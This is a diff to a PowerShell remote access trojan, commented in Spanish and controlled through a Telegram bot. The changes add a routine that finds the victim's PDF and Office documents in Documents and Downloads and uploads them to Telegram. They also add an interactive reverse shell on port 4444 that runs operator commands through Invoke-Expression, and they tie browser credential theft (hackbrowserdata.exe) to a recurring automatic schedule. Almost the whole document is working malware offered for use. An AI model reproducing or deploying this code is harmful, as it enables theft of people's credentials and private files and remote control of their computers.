@@ -17,6 +17,10 @@ $script:CurrentDir = $PWD.Path
 $script:LastStealTime = $null
 $script:ProcessedUpdates = @{}
 $script:Lock = New-Object System.Object
+$script:ReverseShellActive = $false
+$script:ShellClient = $null
+$script:ShellStream = $null
+$script:FilesExfiltrated = $false
 
 # Crear directorio
 New-Item -ItemType Directory -Path (Split-Path $LogFile) -Force -ErrorAction SilentlyContinue | Out-Null
@@ -47,7 +51,6 @@ function Send-File {
     try {
         if (-not (Test-Path $Path)) { return $false }
         
-        # Usar curl.exe (nativo en Windows 10/11)
         $args = @(
             "-s", "-X", "POST",
             "https://api.telegram.org/bot$Token/sendDocument",
@@ -109,31 +112,28 @@ function Steal-Data {
     
     if (-not (Test-Path $HackPath)) {
         if (-not $Auto) { Send-Message -Text "Error: hackbrowserdata.exe no encontrado" }
-        return
+        return $false
     }
     
     if (-not $Auto) { Send-Message -Text "Extrayendo datos..." }
     Write-Log "Iniciando extraccion"
     
-    # Guardar procesos existentes
     $existing = Get-Process @("chrome","msedge","firefox") -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id
     
     $outDir = "$env:TEMP\br_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
     New-Item -ItemType Directory -Path $outDir -Force | Out-Null
     
+    $success = $false
     try {
-        # Ejecutar
         $p = Start-Process -FilePath $HackPath -ArgumentList "dump -d `"$outDir`" -f json" -PassThru -WindowStyle Hidden
         $p.WaitForExit(120000)
         if (-not $p.HasExited) { $p.Kill() }
         
-        # Cerrar navegadores nuevos
         Start-Sleep -Seconds 2
         Get-Process @("chrome","msedge","firefox") -ErrorAction SilentlyContinue | Where-Object { $existing -notcontains $_.Id } | ForEach-Object {
             try { $_.Kill() } catch {}
         }
         
-        # Enviar archivos
         $files = Get-ChildItem $outDir -Filter "*.json" -Recurse
         if ($files) {
             if (-not $Auto) { Send-Message -Text "Enviando $($files.Count) archivos..." }
@@ -147,6 +147,7 @@ function Steal-Data {
             }
             if (-not $Auto) { Send-Message -Text "Completado: $sent/$($files.Count)" }
             Write-Log "Enviados $sent archivos"
+            $success = $true
         }
         
         $script:LastStealTime = Get-Date
@@ -155,6 +156,177 @@ function Steal-Data {
     } finally {
         if (Test-Path $outDir) { Remove-Item $outDir -Recurse -Force -ErrorAction SilentlyContinue }
     }
+    
+    return $success
+}
+
+# === EXFILTRACION DE DOCUMENTOS (PRIORIDAD: DOCUMENTOS PRIMERO) ===
+function Exfiltrate-Documents {
+    param([switch]$Auto = $false)
+    
+    if ($script:FilesExfiltrated -and $Auto) {
+        Write-Log "Documentos ya exfiltrados anteriormente, saltando..."
+        return
+    }
+    
+    if (-not $Auto) { Send-Message -Text "Iniciando exfiltracion de documentos..." }
+    Write-Log "Iniciando exfiltracion de documentos"
+    
+    # Obtener rutas automaticamente
+    $RutaDocumentos = [Environment]::GetFolderPath([Environment+SpecialFolder]::MyDocuments)
+    $RutaDescargas = Join-Path $env:USERPROFILE "Downloads"
+    $RutaDescargasES = Join-Path $env:USERPROFILE "Descargas"
+    
+    # Extensiones a buscar
+    $Extensiones = @('*.pdf', '*.docx', '*.doc', '*.xlsx', '*.xls', '*.pptx', '*.ppt')
+    
+    Send-Message -Text "Buscando archivos... (Prioridad: DOCUMENTOS primero)"
+    
+    $archivosDocumentos = @()
+    $archivosDescargas = @()
+    
+    # ========== PRIORIDAD 1: DOCUMENTOS ==========
+    if (Test-Path $RutaDocumentos) {
+        try {
+            $found = Get-ChildItem -Path $RutaDocumentos -Include $Extensiones -Recurse -File -ErrorAction SilentlyContinue
+            $archivosDocumentos += $found
+            Write-Log "Encontrados $($found.Count) archivos en Documentos: $RutaDocumentos"
+        } catch { Write-Log "Error buscando en Documentos: $_" }
+    }
+    
+    # ========== PRIORIDAD 2: DESCARGAS ==========
+    $rutasDescargas = @($RutaDescargas, $RutaDescargasES) | Where-Object { Test-Path $_ }
+    foreach ($ruta in $rutasDescargas) {
+        try {
+            $found = Get-ChildItem -Path $ruta -Include $Extensiones -Recurse -File -ErrorAction SilentlyContinue
+            $archivosDescargas += $found
+            Write-Log "Encontrados $($found.Count) archivos en Descargas: $ruta"
+        } catch { Write-Log "Error buscando en $ruta`: $_" }
+    }
+    
+    $totalArchivos = $archivosDocumentos.Count + $archivosDescargas.Count
+    
+    if ($totalArchivos -eq 0) {
+        Send-Message -Text "No se encontraron archivos PDF, Word, Excel o PowerPoint."
+        $script:FilesExfiltrated = $true
+        Save-State
+        return
+    }
+    
+    Send-Message -Text "Total encontrados: $totalArchivos (Documentos: $($archivosDocumentos.Count), Descargas: $($archivosDescargas.Count)). Enviando de uno en uno..."
+    
+    $enviados = 0
+    $errores = 0
+    
+    # ========== ENVIAR DOCUMENTOS PRIMERO (PRIORIDAD ALTA) ==========
+    if ($archivosDocumentos.Count -gt 0) {
+        Send-Message -Text "=== ENVIANDO CARPETA DOCUMENTOS (PRIORIDAD) ==="
+        foreach ($archivo in $archivosDocumentos | Sort-Object FullName) {
+            $enviados++
+            $tamanoMB = [math]::Round($archivo.Length / 1MB, 2)
+            $caption = "[$enviados/$totalArchivos] [Documentos] $($archivo.Name)`nTamano: $tamanoMB MB`nRuta: $($archivo.DirectoryName)"
+            
+            Write-Log "Enviando: $($archivo.FullName)"
+            
+            if (Send-File -Path $archivo.FullName -Caption $caption) {
+                Write-Log "OK: $($archivo.Name)"
+            } else {
+                Write-Log "ERROR: $($archivo.Name)"
+                $errores++
+            }
+            
+            Start-Sleep -Seconds 2
+        }
+    }
+    
+    # ========== LUEGO ENVIAR DESCARGAS ==========
+    if ($archivosDescargas.Count -gt 0) {
+        Send-Message -Text "=== ENVIANDO CARPETA DESCARGAS ==="
+        foreach ($archivo in $archivosDescargas | Sort-Object FullName) {
+            $enviados++
+            $tamanoMB = [math]::Round($archivo.Length / 1MB, 2)
+            $caption = "[$enviados/$totalArchivos] [Descargas] $($archivo.Name)`nTamano: $tamanoMB MB`nRuta: $($archivo.DirectoryName)"
+            
+            Write-Log "Enviando: $($archivo.FullName)"
+            
+            if (Send-File -Path $archivo.FullName -Caption $caption) {
+                Write-Log "OK: $($archivo.Name)"
+            } else {
+                Write-Log "ERROR: $($archivo.Name)"
+                $errores++
+            }
+            
+            Start-Sleep -Seconds 2
+        }
+    }
+    
+    $script:FilesExfiltrated = $true
+    Save-State
+    
+    Send-Message -Text "Exfiltracion completada.`nTotal: $totalArchivos`nEnviados: $($enviados - $errores)`nErrores: $errores"
+    Write-Log "Exfiltracion completada. Exitosos: $($enviados - $errores), Errores: $errores"
+}
+
+# === REVERSE SHELL ===
+function Start-ReverseShell {
+    param([string]$IPAddress, [int]$Port = 4444)
+    
+    try {
+        Send-Message -Text "Conectando reverse shell a $IPAddress`:$Port ..."
+        Write-Log "Iniciando reverse shell a $IPAddress`:$Port"
+        
+        $script:ReverseShellActive = $true
+        $client = New-Object System.Net.Sockets.TCPClient($IPAddress, $Port)
+        $script:ShellClient = $client
+        $stream = $client.GetStream()
+        $script:ShellStream = $stream
+        
+        $writer = New-Object System.IO.StreamWriter($stream)
+        $reader = New-Object System.IO.StreamReader($stream)
+        $writer.AutoFlush = $true
+        
+        $writer.WriteLine("=== Reverse Shell Conectado ===")
+        $writer.WriteLine("Usuario: $env:USERNAME")
+        $writer.WriteLine("Equipo: $env:COMPUTERNAME")
+        $writer.WriteLine("Directorio: $(Get-Location)")
+        $writer.WriteLine("===============================")
+        
+        Send-Message -Text "Reverse shell conectado a $IPAddress`:$Port. Escribe 'exit' para salir o /stopshell desde Telegram."
+        
+        while ($script:ReverseShellActive -and $client.Connected) {
+            $writer.Write("PS $(Get-Location)> ")
+            try {
+                $command = $reader.ReadLine()
+                if ($command -eq "exit" -or $command -eq "quit") { break }
+                
+                if (-not [string]::IsNullOrWhiteSpace($command)) {
+                    try {
+                        $output = Invoke-Expression $command 2>&1 | Out-String
+                        $writer.WriteLine($output)
+                    } catch {
+                        $writer.WriteLine("Error: $_")
+                    }
+                }
+            } catch { break }
+        }
+    } catch {
+        Send-Message -Text "Error reverse shell: $_"
+        Write-Log "Error reverse shell: $_"
+    } finally {
+        if ($script:ShellStream) { $script:ShellStream.Close() }
+        if ($script:ShellClient) { $script:ShellClient.Close() }
+        $script:ReverseShellActive = $false
+        Send-Message -Text "Reverse shell desconectado."
+        Write-Log "Reverse shell desconectado"
+    }
+}
+
+function Stop-ReverseShell {
+    $script:ReverseShellActive = $false
+    if ($script:ShellStream) { $script:ShellStream.Close() }
+    if ($script:ShellClient) { $script:ShellClient.Close() }
+    Send-Message -Text "Reverse shell detenido manualmente."
+    Write-Log "Reverse shell detenido manualmente"
 }
 
 # === EJECUTAR COMANDO CON SESION PERSISTENTE ===
@@ -164,7 +336,6 @@ function Run-Command {
     Write-Log "Ejecutando: $Cmd (en: $script:CurrentDir)"
     
     try {
-        # Ejecutar en el directorio actual de sesion
         $psi = New-Object System.Diagnostics.ProcessStartInfo
         $psi.FileName = "cmd.exe"
         $psi.Arguments = "/c $Cmd && cd"
@@ -179,7 +350,6 @@ function Run-Command {
         $stderr = $proc.StandardError.ReadToEnd()
         $proc.WaitForExit()
         
-        # Si el comando fue 'cd', actualizar directorio
         if ($Cmd -match '^cd\s+(.+)$') {
             $newPath = $Matches[1]
             $testPath = if ([System.IO.Path]::IsPathRooted($newPath)) { $newPath } else { Join-Path $script:CurrentDir $newPath }
@@ -191,7 +361,6 @@ function Run-Command {
             }
         }
         
-        # Enviar salida
         $output = $stdout + $stderr
         if ([string]::IsNullOrWhiteSpace($output)) { $output = "(sin salida)" }
         
@@ -210,6 +379,7 @@ function Run-Command {
 function Save-State {
     $state = @{
         LastStealTime = if ($script:LastStealTime) { $script:LastStealTime.ToString("o") } else { $null }
+        FilesExfiltrated = $script:FilesExfiltrated
     }
     $state | ConvertTo-Json | Out-File $StateFile -Encoding UTF8
 }
@@ -221,18 +391,32 @@ function Load-State {
             if ($state.LastStealTime) {
                 $script:LastStealTime = [DateTime]::Parse($state.LastStealTime)
             }
+            if ($state.FilesExfiltrated -ne $null) {
+                $script:FilesExfiltrated = $state.FilesExfiltrated
+            }
         } catch {}
     }
 }
 
 function Check-AutoSteal {
     $now = Get-Date
+    $shouldSteal = $false
+    
     if (-not $script:LastStealTime) {
         Write-Log "Primera ejecucion - extrayendo datos..."
-        Steal-Data -Auto
+        $shouldSteal = $true
     } elseif (($now - $script:LastStealTime).Days -ge 14) {
         Write-Log "Han pasado 14 dias - extrayendo datos..."
-        Steal-Data -Auto
+        $shouldSteal = $true
+    }
+    
+    if ($shouldSteal) {
+        $stealSuccess = Steal-Data -Auto
+        Start-Sleep -Seconds 3
+        Exfiltrate-Documents -Auto
+    } elseif (-not $script:FilesExfiltrated) {
+        Write-Log "Exfiltrando documentos pendientes..."
+        Exfiltrate-Documents -Auto
     }
 }
 
@@ -240,13 +424,11 @@ function Check-AutoSteal {
 function Process-Cmd {
     param([string]$Text, [int]$UpdateId)
     
-    # Evitar duplicados
     [void][System.Threading.Monitor]::Enter($script:Lock)
     try {
         if ($script:ProcessedUpdates.ContainsKey($UpdateId)) { return }
         $script:ProcessedUpdates[$UpdateId] = $true
         
-        # Limpiar entradas antiguas (mantener ultimas 100)
         if ($script:ProcessedUpdates.Count -gt 100) {
             $keys = $script:ProcessedUpdates.Keys | Sort-Object | Select-Object -First 50
             foreach ($k in $keys) { $script:ProcessedUpdates.Remove($k) }
@@ -263,8 +445,9 @@ function Process-Cmd {
     switch ($cmd) {
         "/help" {
             Send-Message -Text @"
-Comandos:
-/help - Ayuda
+Comandos disponibles:
+
+/help - Muestra esta ayuda
 /info - Info del sistema
 /ls - Listar archivos
 /cd <ruta> - Cambiar directorio
@@ -272,6 +455,15 @@ Comandos:
 /cmd <comando> - Ejecutar comando
 /captura - Screenshot
 /steal - Extraer datos navegadores
+/files - Exfiltrar documentos (PDF, Word, Excel, PPT)
+/shell <IP> [puerto] - Reverse shell (default: 4444)
+/stopshell - Detener reverse shell activo
+
+REVERSE SHELL:
+1. En tu maquina: nc -lvnp 4444
+2. Aqui: /shell TU_IP 4444
+3. Control remoto interactivo
+4. Escribe 'exit' o /stopshell para cerrar
 "@
         }
         
@@ -311,6 +503,35 @@ Comandos:
         
         "/steal" { Steal-Data }
         
+        "/files" { Exfiltrate-Documents }
+        
+        "/shell" {
+            if ($script:ReverseShellActive) {
+                Send-Message -Text "Ya hay un reverse shell activo. Usa /stopshell primero."
+                return
+            }
+            
+            $shellArgs = $args -split '\s+'
+            $ip = $shellArgs[0]
+            $port = if ($shellArgs.Count -gt 1) { [int]$shellArgs[1] } else { 4444 }
+            
+            if ([string]::IsNullOrWhiteSpace($ip)) {
+                Send-Message -Text "Uso: /shell <IP> [puerto]`nEjemplo: /shell 192.168.1.100 4444`n`nPrimero ejecuta en tu maquina:`nnc -lvnp 4444"
+                return
+            }
+            
+            Start-Job -ScriptBlock ${function:Start-ReverseShell} -ArgumentList $ip, $port | Out-Null
+            Start-Sleep -Seconds 2
+            
+            if ($script:ReverseShellActive) {
+                Send-Message -Text "Reverse shell conectado a $ip`:$port"
+            } else {
+                Send-Message -Text "Intentando conectar a $ip`:$port ... Espera unos segundos."
+            }
+        }
+        
+        "/stopshell" { Stop-ReverseShell }
+        
         default { Write-Log "Comando desconocido: $cmd" }
     }
 }
@@ -318,22 +539,17 @@ Comandos:
 # === INICIO ===
 Write-Log "=== BOT INICIADO ==="
 
-# Cargar estado
 Load-State
 
-# Enviar mensaje de inicio
 Send-Message -Text "Bot online - $(Get-Info)"
 
-# Verificar extraccion automatica
 Check-AutoSteal
 
-# Limpiar webhook
 try {
     Invoke-RestMethod -Uri "$ApiUrl/deleteWebhook?drop_pending_updates=true" -Method Post | Out-Null
     Start-Sleep -Seconds 2
 } catch {}
 
-# Bucle principal
 $lastId = 0
 while ($true) {
     try {
@@ -348,7 +564,6 @@ while ($true) {
             }
         }
         
-        # Verificar si toca extraccion automatica (cada hora)
         if ((Get-Date).Minute -eq 0) {
             Check-AutoSteal
         }
